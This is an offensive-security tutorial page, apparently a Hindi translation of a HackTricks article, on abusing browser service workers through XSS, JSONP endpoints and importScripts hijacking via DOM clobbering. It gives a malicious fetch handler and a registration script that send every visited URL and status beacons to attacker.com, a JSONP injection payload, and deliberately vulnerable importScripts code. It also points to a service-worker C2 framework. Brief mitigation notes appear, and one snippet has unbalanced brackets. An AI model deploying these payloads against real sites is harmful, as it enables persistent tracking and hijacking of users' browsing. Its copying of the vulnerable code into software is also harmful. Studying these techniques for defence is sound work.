# Abusing Service Workers

{{#include ../../banners/hacktricks-training.md}}

## Basic Information

A **service worker** एक स्क्रिप्ट है जो आपके ब्राउज़र द्वारा बैकग्राउंड में चलती है, किसी भी वेब पृष्ठ से अलग, ऐसी सुविधाएँ सक्षम करती है जो किसी वेब पृष्ठ या उपयोगकर्ता इंटरैक्शन की आवश्यकता नहीं होती, इस प्रकार **ऑफलाइन और बैकग्राउंड प्रोसेसिंग** क्षमताओं को बढ़ाती है। सेवा कार्यकर्ताओं पर विस्तृत जानकारी [यहाँ](https://developers.google.com/web/fundamentals/primers/service-workers) मिल सकती है। एक कमजोर वेब डोमेन के भीतर सेवा कार्यकर्ताओं का शोषण करके, हमलावर पीड़ित के सभी पृष्ठों के साथ इंटरैक्शन पर नियंत्रण प्राप्त कर सकते हैं।

### Checking for Existing Service Workers

मौजूदा सेवा कार्यकर्ताओं की जांच **Developer Tools** में **Application** टैब के **Service Workers** सेक्शन में की जा सकती है। एक और तरीका है [chrome://serviceworker-internals](https://chromium.googlesource.com/chromium/src/+/main/docs/security/chrome%3A/serviceworker-internals) पर जाकर अधिक विस्तृत दृश्य प्राप्त करना।

### Push Notifications

**Push notification permissions** सीधे एक **service worker** की सर्वर के साथ संवाद करने की क्षमता को प्रभावित करते हैं बिना सीधे उपयोगकर्ता इंटरैक्शन के। यदि अनुमतियाँ अस्वीकृत की जाती हैं, तो यह सेवा कार्यकर्ता की निरंतर खतरे के रूप में संभावनाओं को सीमित करता है। इसके विपरीत, अनुमतियाँ देने से सुरक्षा जोखिम बढ़ जाते हैं क्योंकि यह संभावित शोषण के रिसेप्शन और निष्पादन को सक्षम करता है।

## Attack Creating a Service Worker

इस कमजोरी का शोषण करने के लिए आपको निम्नलिखित खोजने की आवश्यकता है:

- सर्वर पर **मनमाने JS** फ़ाइलें **अपलोड** करने का एक तरीका और **अपलोड की गई JS फ़ाइल** के सेवा कार्यकर्ता को **लोड करने के लिए एक XSS**
- एक **कमजोर JSONP अनुरोध** जहाँ आप **आउटपुट (मनमाने JS कोड के साथ)** को **हेरफेर** कर सकते हैं और एक **XSS** जो **पेलोड के साथ JSONP को लोड करेगा** जो **एक दुर्भावनापूर्ण सेवा कार्यकर्ता** को **लोड करेगा**।

निम्नलिखित उदाहरण में मैं एक कोड प्रस्तुत करने जा रहा हूँ जो **एक नया सेवा कार्यकर्ता पंजीकृत** करेगा जो `fetch` इवेंट को सुनेगा और **हमलावर के सर्वर को प्रत्येक प्राप्त URL भेजेगा** (यह वह कोड है जिसे आपको **सर्वर** पर **अपलोड** करने की आवश्यकता होगी या **कमजोर JSONP** प्रतिक्रिया के माध्यम से लोड करना होगा):
```javascript
self.addEventListener('fetch', function(e) {
e.respondWith(caches.match(e.request).then(function(response) {
fetch('https://attacker.com/fetch_url/' + e.request.url)
});
```
और यह वह कोड है जो **कार्यकर्ता को पंजीकृत** करेगा (यह कोड जिसे आप **XSS** का दुरुपयोग करके निष्पादित कर सकेंगे)। इस मामले में एक **GET** अनुरोध **हमलावरों** के सर्वर पर भेजा जाएगा **सूचित** करने के लिए कि सेवा कार्यकर्ता की **पंजीकरण** सफल थी या नहीं:
```javascript
<script>
window.addEventListener('load', function() {
var sw = "/uploaded/ws_js.js";
navigator.serviceWorker.register(sw, {scope: '/'})
.then(function(registration) {
var xhttp2 = new XMLHttpRequest();
xhttp2.open("GET", "https://attacker.com/SW/success", true);
xhttp2.send();
}, function (err) {
var xhttp2 = new XMLHttpRequest();
xhttp2.open("GET", "https://attacker.com/SW/error", true);
xhttp2.send();
});
});
</script>
```
यदि आप एक कमजोर JSONP एंडपॉइंट का दुरुपयोग कर रहे हैं, तो आपको मान को `var sw` के अंदर रखना चाहिए। उदाहरण के लिए:
```javascript
var sw =
"/jsonp?callback=onfetch=function(e){ e.respondWith(caches.match(e.request).then(function(response){ fetch('https://attacker.com/fetch_url/' + e.request.url) }) )}//"
```
एक **C2** है जो **Service Workers के शोषण** के लिए समर्पित है जिसे [**Shadow Workers**](https://shadow-workers.github.io) कहा जाता है, जो इन कमजोरियों का दुरुपयोग करने के लिए बहुत उपयोगी होगा।

**24-घंटे का कैश निर्देश** एक दुर्भावनापूर्ण या समझौता किए गए **service worker (SW)** के जीवन को XSS कमजोरियों के सुधार के बाद अधिकतम 24 घंटों तक सीमित करता है, ऑनलाइन क्लाइंट स्थिति मानते हुए। कमजोरियों को कम करने के लिए, साइट ऑपरेटर SW स्क्रिप्ट के Time-To-Live (TTL) को कम कर सकते हैं। डेवलपर्स को भी [**service worker kill-switch**](https://stackoverflow.com/questions/33986976/how-can-i-remove-a-buggy-service-worker-or-implement-a-kill-switch/38980776#38980776) बनाने की सलाह दी जाती है ताकि तेजी से निष्क्रिय किया जा सके।

## DOM Clobbering के माध्यम से SW में `importScripts` का दुरुपयोग

**`importScripts`** फ़ंक्शन जो एक Service Worker से कॉल किया जाता है, **एक अलग डोमेन से एक स्क्रिप्ट आयात कर सकता है**। यदि इस फ़ंक्शन को एक **पैरामीटर का उपयोग करके कॉल किया जाता है जिसे एक हमलावर संशोधित कर सकता है**, तो वह **अपने डोमेन से एक JS स्क्रिप्ट आयात कर सकेगा** और XSS प्राप्त कर सकेगा।

**यह CSP सुरक्षा को भी बायपास करता है।**

**उदाहरण कमजोर कोड:**

- **index.html**
```html
<script>
navigator.serviceWorker.register(
"/dom-invader/testcases/augmented-dom-import-scripts/sw.js" +
location.search
)
// attacker controls location.search
</script>
```
- **sw.js**
```javascript
const searchParams = new URLSearchParams(location.search)
let host = searchParams.get("host")
self.importScripts(host + "/sw_extra.js")
//host can be controllable by an attacker
```
### With DOM Clobbering

DOM Clobbering क्या है इसके बारे में अधिक जानकारी के लिए देखें:

{{#ref}}
dom-clobbering.md
{{#endref}}

यदि URL/domain जहाँ SW **`importScripts`** को कॉल करने के लिए उपयोग कर रहा है, **एक HTML तत्व के अंदर है**, तो इसे **DOM Clobbering के माध्यम से संशोधित करना संभव है** ताकि SW **आपके अपने डोमेन से एक स्क्रिप्ट लोड करे**।

इसका उदाहरण देखने के लिए संदर्भ लिंक देखें।

## References

- [https://portswigger.net/research/hijacking-service-workers-via-dom-clobbering](https://portswigger.net/research/hijacking-service-workers-via-dom-clobbering)

{{#include ../../banners/hacktricks-training.md}}
